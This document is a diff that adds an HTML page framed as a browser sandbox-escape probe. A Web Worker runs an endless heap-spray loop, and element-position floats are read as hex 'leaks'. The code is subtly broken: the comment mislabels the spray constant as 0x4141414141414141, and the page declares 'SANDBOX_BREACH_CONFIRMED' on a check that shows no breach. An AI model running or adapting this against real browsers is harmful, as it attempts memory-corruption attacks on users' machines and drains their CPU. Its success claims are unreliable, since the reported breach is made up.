@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000; color:#0f0; font-family:monospace; height: 5000px; overflow: hidden;">
+    <h3 style="color:#0ff">T239_HI_VIS_PROBE_v146.0</h3>
+    <hr style="border:1px solid #0ff">
+    <div id="target" style="width:20px; height:20px; background:red; position:absolute; top:200px; left:50%;"></div>
+    <div id="out" style="font-size: 11px; line-height: 1.3;">STATUS: INJECTING_READ_PATTERN...</div>
+
+    <script>
+        const log = (m, color="#0f0") => {
+            const out = document.getElementById('out');
+            out.innerHTML = `<span style="color:${color}">> ${m}</span><br>` + out.innerHTML.slice(0, 1200);
+        };
+        const target = document.getElementById('target');
+        let trapped = false;
+
+        function floatToHex(f) {
+            const buf = new ArrayBuffer(8);
+            (new Float64Array(buf))[0] = f;
+            const view = new Uint32Array(buf);
+            return "0x" + view[1].toString(16).padStart(8, '0') + view[0].toString(16).padStart(8, '0');
+        }
+
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+            onmessage = function() {
+                const spray = new Float64Array(2048);
+                // 0x4141414141414141 in float representation
+                const pattern = 1.4916681462400413e-154; 
+                while(true) { spray.fill(pattern); }
+            }
+        `])));
+        worker.postMessage("s");
+
+        const observer = new IntersectionObserver((entries) => {
+            if (trapped) return;
+            const hex = floatToHex(entries[0].boundingClientRect.top);
+
+            if (hex.startsWith("0x0000")) {
+                trapped = true;
+                worker.terminate();
+                target.style.background = "#fff";
+                target.style.boxShadow = "0 0 40px #fff";
+                log(`!!! CRITICAL_HIT: ${hex} !!!`, "#fff");
+                log("SANDBOX_BREACH_CONFIRMED.", "#fff");
+            } 
+            
+            else if (hex.includes("414141")) {
+                log(`PATTERN_DETECTION: ${hex}`, "#ff0");
+            }
+            else if (!hex.startsWith("0x4069")) {
+                log(`DATA: ${hex}`, "#006600");
+            }
+        }, { root: null, threshold: Array.from({length: 100}, (_, i) => i / 100) });
+
+        observer.observe(target);
+        setInterval(() => { if(!trapped) target.style.top = (200 + Math.random()) + "px"; }, 16);
+    </script>
+</body>
+</html>
